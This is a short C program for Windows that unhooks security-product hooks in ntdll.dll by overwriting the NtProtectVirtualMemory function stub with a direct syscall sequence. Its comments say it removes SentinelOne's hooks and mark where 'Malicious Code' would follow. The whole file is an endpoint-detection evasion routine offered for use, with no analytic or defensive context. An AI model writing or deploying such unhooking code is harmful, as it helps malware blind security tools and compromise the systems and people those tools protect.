#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

VOID PatchHook(CHAR* address, unsigned char id, char high);

VOID CleanUp() {
    HANDLE hDll = LoadLibrary("ntdll.dll");

    FARPROC NtProtectVirtualMemory = GetProcAddress(hDll, "NtProtectVirtualMemory");

    PatchHook(NtProtectVirtualMemory, 0x50, 0x00);  // unhooking first since we are going to need it to unhook APIs

    CloseHandle(hDll);
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    DWORD dwSize = 11;
    CHAR* patch_address = address;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3
    CHAR* patch[dwSize];
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
}

int main (int argc, char **argv) {
    CleanUp();

    // No More Hook From SentinelOne
    // Malicious Code

    return 0;
}
